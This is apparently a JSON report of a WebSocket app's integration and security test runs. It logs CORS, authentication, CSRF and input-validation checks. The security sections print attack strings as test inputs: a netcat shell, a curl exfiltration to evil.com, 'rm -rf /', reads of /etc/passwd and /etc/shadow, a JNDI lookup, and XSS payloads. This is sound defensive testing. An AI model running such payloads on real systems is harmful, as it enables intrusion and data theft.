{
  "timestamp": "2025-08-28 15:53:16",
  "overall_success": true,
  "total_duration": 14.281616926193237,
  "test_results": {
    "configuration_tests": {
      "success": true,
      "environments_tested": 3
    },
    "Integration Tests": {
      "success": true,
      "returncode": 0,
      "stdout": "[2025-08-28T15:53:03.673632] INFO root - DB_POOL_SIZE from environment after load_dotenv: 20 (taskName=None)\n[2025-08-28T15:53:03.852666] INFO root - MySQL database pool size loaded from environment: 20 (taskName=None)\n[2025-08-28T15:53:03.852742] INFO root - MySQL database max overflow loaded from environment: 30 (taskName=None)\n[2025-08-28T15:53:03.853001] INFO storage_configuration_service - Storage configuration loaded: max_storage=10.0GB, warning_threshold=80.0%, monitoring_enabled=True (taskName=None)\n[2025-08-28T15:53:03.860625] INFO database - MySQL connection parameters validated successfully (taskName=None)\n[2025-08-28T15:53:03.930847] INFO database - MySQL database tables and indexes created successfully (taskName=None)\n[2025-08-28T15:53:03.931117] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:03.931218] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Testing Authentication and Authorization ===\nTesting Admin User...\n  \u2713 User namespace access granted for Admin User\n  \u2713 Admin namespace access granted for Admin User\nTesting Regular User...\n  \u2713 User namespace access granted for Regular User\n  \u2713 Admin namespace access denied for Regular User\nTesting Unauthenticated...\n  \u2713 User namespace access denied for Unauthenticated\n\u2713 Authentication and authorization testing completed\n[2025-08-28T15:53:03.932220] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:03.932289] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Configuration Validation Testing ===\nTesting Valid Configuration...\n[2025-08-28T15:53:03.932575] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n  \u2713 Configuration validated successfully\nTesting Invalid CORS Origins...\n[2025-08-28T15:53:03.933675] WARNING websocket_config_manager - WebSocket configuration validation warnings: Invalid CORS origin: invalid-url; Invalid CORS origin: another-invalid (taskName=None)\n  \u2713 Configuration errors detected: 2 errors\nTesting Missing Required Config...\n[2025-08-28T15:53:03.934643] ERROR websocket_config_manager - Failed to load WebSocket configuration: invalid literal for int() with base 10: '' (taskName=None)\n[2025-08-28T15:53:03.934671] INFO websocket_config_manager - Creating fallback WebSocket configuration (taskName=None)\n  \u2713 Configuration errors detected: 1 errors\n\u2713 Configuration validation testing completed\n[2025-08-28T15:53:03.935544] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:03.935599] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Testing CORS Configuration Across Environments ===\nTesting development environment...\n[2025-08-28T15:53:03.935864] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:03.935914] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n[2025-08-28T15:53:03.936040] INFO websocket_cors_manager - Calculated 28 allowed CORS origins (taskName=None)\n  \u2713 CORS origins for development: ['http://127.0.0.1:3000', 'http://127.0.0.1:3000/', 'http://127.0.0.1:4200', 'http://127.0.0.1:5000', 'http://127.0.0.1:5000/', 'http://127.0.0.1:8000', 'http://127.0.0.1:8080', 'http://127.0.0.1:8080/', 'http://localhost:3000', 'http://localhost:3000/', 'http://localhost:4200', 'http://localhost:5000', 'http://localhost:5000/', 'http://localhost:8000', 'http://localhost:8080', 'http://localhost:8080/', 'https://127.0.0.1:3000', 'https://127.0.0.1:3000/', 'https://127.0.0.1:5000', 'https://127.0.0.1:5000/', 'https://127.0.0.1:8080', 'https://127.0.0.1:8080/', 'https://localhost:3000', 'https://localhost:3000/', 'https://localhost:5000', 'https://localhost:5000/', 'https://localhost:8080', 'https://localhost:8080/']\n  \u2713 All origins validated for development\nTesting staging environment...\n[2025-08-28T15:53:03.937014] INFO websocket_config_manager - Generated CORS origins: ['http://staging.example.com:443', 'https://staging.example.com', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:03.937073] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n[2025-08-28T15:53:03.937216] INFO websocket_cors_manager - Calculated 20 allowed CORS origins (taskName=None)\n  \u2713 CORS origins for staging: ['http://127.0.0.1:3000', 'http://127.0.0.1:3000/', 'http://127.0.0.1:8080', 'http://127.0.0.1:8080/', 'http://localhost:3000', 'http://localhost:3000/', 'http://localhost:8080', 'http://localhost:8080/', 'http://staging.example.com', 'http://staging.example.com:443', 'https://127.0.0.1:3000', 'https://127.0.0.1:3000/', 'https://127.0.0.1:8080', 'https://127.0.0.1:8080/', 'https://localhost:3000', 'https://localhost:3000/', 'https://localhost:8080', 'https://localhost:8080/', 'https://staging.example.com', 'https://staging.example.com:443']\n  \u2713 All origins validated for staging\nTesting production environment...\n[2025-08-28T15:53:03.938216] INFO websocket_config_manager - Generated CORS origins: ['http://app.example.com:443', 'https://app.example.com', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:03.938273] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n[2025-08-28T15:53:03.938399] INFO websocket_cors_manager - Calculated 20 allowed CORS origins (taskName=None)\n  \u2713 CORS origins for production: ['http://127.0.0.1:3000', 'http://127.0.0.1:3000/', 'http://127.0.0.1:8080', 'http://127.0.0.1:8080/', 'http://app.example.com', 'http://app.example.com:443', 'http://localhost:3000', 'http://localhost:3000/', 'http://localhost:8080', 'http://localhost:8080/', 'https://127.0.0.1:3000', 'https://127.0.0.1:3000/', 'https://127.0.0.1:8080', 'https://127.0.0.1:8080/', 'https://app.example.com', 'https://app.example.com:443', 'https://localhost:3000', 'https://localhost:3000/', 'https://localhost:8080', 'https://localhost:8080/']\n  \u2713 All origins validated for production\n\u2713 CORS environment configuration testing completed\n[2025-08-28T15:53:03.939402] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:03.939520] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Testing End-to-End Browser Compatibility ===\nTesting Chrome Desktop...\n  \u2713 WebSocket transport available for Chrome Desktop\n  \u2713 Polling transport available for Chrome Desktop\n[2025-08-28T15:53:03.939732] INFO websocket_cors_manager - Calculated 24 allowed CORS origins (taskName=None)\n  \u2713 CORS origins configured: 24 origins\nTesting Firefox Desktop...\n  \u2713 WebSocket transport available for Firefox Desktop\n  \u2713 Polling transport available for Firefox Desktop\n  \u2713 CORS origins configured: 24 origins\nTesting Safari Desktop...\n  \u2713 WebSocket transport available for Safari Desktop\n  \u2713 Polling transport available for Safari Desktop\n  \u2713 CORS origins configured: 24 origins\nTesting Mobile Chrome...\n  \u2713 WebSocket transport available for Mobile Chrome\n  \u2713 Polling transport available for Mobile Chrome\n  \u2713 CORS origins configured: 24 origins\nTesting Legacy Browser...\n  \u2713 Polling transport available for Legacy Browser\n  \u2713 CORS origins configured: 24 origins\n\u2713 Browser compatibility testing completed\n[2025-08-28T15:53:03.939934] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:03.939985] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Testing Error Recovery and Fallback Mechanisms ===\nTesting Redis Connection Failure...\n  \u2713 Configuration available despite Redis failure\nTesting Database Connection Failure...\n[2025-08-28T15:53:03.940412] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:03.940498] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 Graceful handling of database failure\nTesting WebSocket Transport Failure...\n  \u2713 Polling transport available as WebSocket fallback\nTesting CORS Preflight Failure...\n[2025-08-28T15:53:03.940619] INFO websocket_cors_manager - Calculated 24 allowed CORS origins (taskName=None)\n  \u2713 Invalid CORS origin properly rejected\n  \u2713 Fallback CORS origins available\nTesting Authentication Service Failure...\n  \u2713 Authentication service failure handled: Exception\n\u2713 Error recovery and fallback testing completed\n[2025-08-28T15:53:03.940796] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:03.940843] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Integration Health Check ===\nChecking websocket_config_manager...\n  \u2713 websocket_config_manager: HEALTHY\nChecking cors_manager...\n[2025-08-28T15:53:03.940982] INFO websocket_cors_manager - Calculated 24 allowed CORS origins (taskName=None)\n  \u2713 cors_manager: HEALTHY\nChecking websocket_factory...\n  \u2717 websocket_factory: UNHEALTHY - 'WebSocketFactory' object has no attribute 'get_socketio_config'\nChecking websocket_auth_handler...\n[2025-08-28T15:53:03.941018] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:03.941049] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 websocket_auth_handler: HEALTHY\nChecking namespace_manager...\n[2025-08-28T15:53:03.941289] INFO websocket_namespace_manager - Created room user_general in namespace / by user 0 (taskName=None)\n[2025-08-28T15:53:03.941319] INFO websocket_namespace_manager - Created room caption_progress in namespace / by user 0 (taskName=None)\n[2025-08-28T15:53:03.941342] INFO websocket_namespace_manager - User namespace configured successfully (taskName=None)\n[2025-08-28T15:53:03.941422] INFO websocket_namespace_manager - Created room admin_general in namespace /admin by user 0 (taskName=None)\n[2025-08-28T15:53:03.941448] INFO websocket_namespace_manager - Created room system_monitoring in namespace /admin by user 0 (taskName=None)\n[2025-08-28T15:53:03.941470] INFO websocket_namespace_manager - Created room security_alerts in namespace /admin by user 0 (taskName=None)\n[2025-08-28T15:53:03.941487] INFO websocket_namespace_manager - Admin namespace configured successfully (taskName=None)\n[2025-08-28T15:53:03.941505] INFO websocket_namespace_manager - Default namespaces configured successfully (taskName=None)\n  \u2713 namespace_manager: HEALTHY\n\nOverall System Health: 80.0% (4/5 components healthy)\n\u2713 Integration health check completed\n[2025-08-28T15:53:03.941600] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:03.941644] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Performance Testing Under Load ===\nTesting Connection Load Test...\n  \u2713 Connection load test: 100.0% success rate in 0.00s\nTesting Message Throughput Test...\n  \u2713 Message throughput: 7626007.3 messages/second\nTesting Memory Usage Test...\n[2025-08-28T15:53:03.946638] INFO websocket_cors_manager - Calculated 24 allowed CORS origins (taskName=None)\n  \u2713 Memory usage: 0.0MB increase over 10s\n\u2713 Performance testing completed\n[2025-08-28T15:53:14.014318] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:14.014695] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Security and Penetration Testing ===\nTesting CORS Origin Spoofing...\n[2025-08-28T15:53:14.015248] INFO websocket_cors_manager - Calculated 24 allowed CORS origins (taskName=None)\n  \u2713 All malicious CORS origins properly rejected\nTesting Session Hijacking Attempt...\n[2025-08-28T15:53:14.015478] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.015598] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:14.015676] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.015751] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:14.015828] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.015901] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 Session hijacking attempts properly blocked\nTesting CSRF Attack Simulation...\n  \u2713 CSRF attack protection validated\nTesting Input Validation Bypass...\n    \u2713 Malicious input detected: <script>alert(\"XSS\")</script>...\n    \u2713 Malicious input detected: \"; DROP TABLE users; --...\n    \u2713 Malicious input detected: ../../../etc/passwd...\n    \u2713 Malicious input detected: ${jndi:ldap://evil.com/a}...\n  \u2713 Input validation security testing completed\nTesting Rate Limiting Bypass...\n  \u2713 Rate limiting configuration validated\n\u2713 Security and penetration testing completed\n",
      "stderr": "test_authentication_authorization_interfaces (tests.integration.test_websocket_final_integration.WebSocketFinalIntegrationTest.test_authentication_authorization_interfaces)\nTest authentication and authorization across user and admin interfaces ... ok\ntest_configuration_validation (tests.integration.test_websocket_final_integration.WebSocketFinalIntegrationTest.test_configuration_validation)\nTest comprehensive configuration validation ... ok\ntest_cors_configuration_environments (tests.integration.test_websocket_final_integration.WebSocketFinalIntegrationTest.test_cors_configuration_environments)\nTest CORS configuration across development, staging, and production ... ok\ntest_end_to_end_browser_compatibility (tests.integration.test_websocket_final_integration.WebSocketFinalIntegrationTest.test_end_to_end_browser_compatibility)\nTest end-to-end functionality across different browser scenarios ... ok\ntest_error_recovery_fallback_mechanisms (tests.integration.test_websocket_final_integration.WebSocketFinalIntegrationTest.test_error_recovery_fallback_mechanisms)\nTest error recovery and fallback mechanisms under various failure conditions ... ok\ntest_integration_health_check (tests.integration.test_websocket_final_integration.WebSocketFinalIntegrationTest.test_integration_health_check)\nPerform comprehensive health check of the integrated system ... ok\ntest_performance_under_load (tests.integration.test_websocket_final_integration.WebSocketFinalIntegrationTest.test_performance_under_load)\nTest WebSocket performance under various load conditions ... ok\ntest_security_penetration_testing (tests.integration.test_websocket_final_integration.WebSocketFinalIntegrationTest.test_security_penetration_testing)\nConduct security testing and penetration testing for WebSocket endpoints ... ok\n\n----------------------------------------------------------------------\nRan 8 tests in 10.164s\n\nOK\n",
      "duration": 11.71646523475647
    },
    "Security Tests": {
      "success": true,
      "returncode": 0,
      "stdout": "[2025-08-28T15:53:14.223169] INFO root - DB_POOL_SIZE from environment after load_dotenv: 20 (taskName=None)\n[2025-08-28T15:53:14.400503] INFO root - MySQL database pool size loaded from environment: 20 (taskName=None)\n[2025-08-28T15:53:14.400586] INFO root - MySQL database max overflow loaded from environment: 30 (taskName=None)\n[2025-08-28T15:53:14.400842] INFO storage_configuration_service - Storage configuration loaded: max_storage=10.0GB, warning_threshold=80.0%, monitoring_enabled=True (taskName=None)\n[2025-08-28T15:53:14.408250] INFO database - MySQL connection parameters validated successfully (taskName=None)\n[2025-08-28T15:53:14.475511] INFO database - MySQL database tables and indexes created successfully (taskName=None)\n[2025-08-28T15:53:14.475745] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:14.475832] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Testing Authentication Timing Attack Prevention ===\n[2025-08-28T15:53:14.476049] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.476125] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:14.476157] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.476190] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:14.476216] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.476244] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:14.476268] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.476295] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:14.476317] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.476342] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:14.476365] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.476389] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:14.476411] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.476435] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:14.476457] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.476481] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:14.476502] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.476526] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:14.476547] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.476572] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:14.476594] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.476621] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:14.476642] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.476666] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:14.476687] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.476711] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\nAverage valid authentication time: 0.0001s\nAverage invalid authentication time: 0.0000s\nTiming difference: 0.0000s\n\u2713 Authentication timing appears consistent\n\u2713 Authentication timing attack prevention tested\n[2025-08-28T15:53:14.476881] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:14.476934] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Testing Command Injection Prevention ===\nTesting command injection payload: ; ls -la...\n  \u2713 Command injection pattern detected and would be blocked\nTesting command injection payload: | cat /etc/passwd...\n  \u2713 Command injection pattern detected and would be blocked\nTesting command injection payload: && whoami...\n  \u2713 Command injection pattern detected and would be blocked\nTesting command injection payload: ; cat /etc/shadow...\n  \u2713 Command injection pattern detected and would be blocked\nTesting command injection payload: `id`...\n  \u2713 Command injection pattern detected and would be blocked\nTesting command injection payload: $(whoami)...\n  \u2713 Command injection pattern detected and would be blocked\nTesting command injection payload: ; rm -rf /...\n  \u2713 Command injection pattern detected and would be blocked\nTesting command injection payload: | nc -l -p 1234 -e /bin/sh...\n  \u2713 Command injection pattern detected and would be blocked\nTesting command injection payload: ; curl http://evil.com/steal?data=$(cat /etc/passw...\n  \u2713 Command injection pattern detected and would be blocked\nTesting command injection payload: && python -c \"import os; os.system('id')\"...\n  \u2713 Command injection pattern detected and would be blocked\n\u2713 Command injection prevention validated\n[2025-08-28T15:53:14.477124] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:14.477173] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Testing CORS Origin Spoofing Prevention ===\nTesting malicious origin: http://evil.com\n[2025-08-28T15:53:14.477323] INFO websocket_cors_manager - Calculated 24 allowed CORS origins (taskName=None)\n  \u2713 Origin properly rejected: http://evil.com\nTesting malicious origin: https://phishing-site.net\n  \u2713 Origin properly rejected: https://phishing-site.net\nTesting malicious origin: javascript:alert(1)\n  \u2713 Origin properly rejected: javascript:alert(1)\nTesting malicious origin: data:text/html,<script>alert(1)</script>\n  \u2713 Origin properly rejected: data:text/html,<script>alert(1)</script>\nTesting malicious origin: file:///etc/passwd\n  \u2713 Origin properly rejected: file:///etc/passwd\nTesting malicious origin: ftp://malicious.com\n  \u2713 Origin properly rejected: ftp://malicious.com\nTesting malicious origin: http://127.0.0.1:5000.evil.com\n[2025-08-28T15:53:14.477422] ERROR websocket_cors_manager - Error validating origin pattern for http://127.0.0.1:5000.evil.com: Port could not be cast to integer value as '5000.evil.com' (taskName=None)\n  \u2713 Origin properly rejected: http://127.0.0.1:5000.evil.com\nTesting malicious origin: https://localhost:5000@evil.com\n  \u2713 Origin properly rejected: https://localhost:5000@evil.com\nTesting malicious origin: http://0x7f000001:5000\n  \u2713 Origin properly rejected: http://0x7f000001:5000\nTesting malicious origin: http://2130706433:5000\n  \u2713 Origin properly rejected: http://2130706433:5000\nTesting malicious origin: http://017700000001:5000\n  \u2713 Origin properly rejected: http://017700000001:5000\nTesting malicious origin: null\n  \u2713 Origin properly rejected: null\nTesting malicious origin: \n  \u2713 Origin properly rejected: \nTesting malicious origin: *\n  \u2713 Origin properly rejected: *\nTesting malicious origin: http://*.evil.com\n  \u2713 Origin properly rejected: http://*.evil.com\nTesting malicious origin: https://sub.evil.com\n  \u2713 Origin properly rejected: https://sub.evil.com\n\u2713 CORS origin spoofing prevention validated\n[2025-08-28T15:53:14.477588] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:14.477636] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Testing CSRF Protection Validation ===\nTesting Missing CSRF Token...\n  \u2713 CSRF protection should block this request\nTesting Invalid CSRF Token...\n  \u2713 CSRF protection should block this request\nTesting Valid CSRF Token...\n  \u2713 CSRF protection should allow this request\nTesting Cross-Origin CSRF Attempt...\n  \u2713 CSRF protection should block this request\n\u2713 CSRF protection validation completed\n[2025-08-28T15:53:14.477810] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:14.477854] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Testing Input Validation Bypass Attempts ===\nTesting bypass payload: %3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E...\n    \u2713 No obvious malicious pattern in message_content\n    \u2713 No obvious malicious pattern in username\n    \u2713 No obvious malicious pattern in room_name\n    \u2713 No obvious malicious pattern in event_data\nTesting bypass payload: &lt;script&gt;alert(\"XSS\")&lt;/script&gt;...\n    \u2713 Malicious pattern detected in message_content\n    \u2713 Malicious pattern detected in username\n    \u2713 Malicious pattern detected in room_name\n    \u2713 Malicious pattern detected in event_data\nTesting bypass payload: \\u003cscript\\u003ealert(\"XSS\")\\u003c/script\\u003e...\n    \u2713 Malicious pattern detected in message_content\n    \u2713 Malicious pattern detected in username\n    \u2713 Malicious pattern detected in room_name\n    \u2713 Malicious pattern detected in event_data\nTesting bypass payload: %253Cscript%253Ealert%2528%2522XSS%2522%2529%253C%...\n    \u2713 No obvious malicious pattern in message_content\n    \u2713 No obvious malicious pattern in username\n    \u2713 No obvious malicious pattern in room_name\n    \u2713 No obvious malicious pattern in event_data\nTesting bypass payload: <ScRiPt>AlErT(\"XSS\")</ScRiPt>...\n    \u2713 Malicious pattern detected in message_content\n    \u2713 Malicious pattern detected in username\n    \u2713 Malicious pattern detected in room_name\n    \u2713 Malicious pattern detected in event_data\nTesting bypass payload: <script>alert(\"XSS\")</script>\u0000...\n    \u2713 Malicious pattern detected in message_content\n    \u2713 Malicious pattern detected in username\n    \u2713 Malicious pattern detected in room_name\n    \u2713 Malicious pattern detected in event_data\nTesting bypass payload: <script>/**/alert(\"XSS\")/**/</script>...\n    \u2713 Malicious pattern detected in message_content\n    \u2713 Malicious pattern detected in username\n    \u2713 Malicious pattern detected in room_name\n    \u2713 Malicious pattern detected in event_data\nTesting bypass payload: test\" onmouseover=\"alert('XSS')\" \"...\n    \u2713 Malicious pattern detected in message_content\n    \u2713 Malicious pattern detected in username\n    \u2713 Malicious pattern detected in room_name\n    \u2713 Malicious pattern detected in event_data\nTesting bypass payload: javascript:alert(\"XSS\")...\n    \u2713 Malicious pattern detected in message_content\n    \u2713 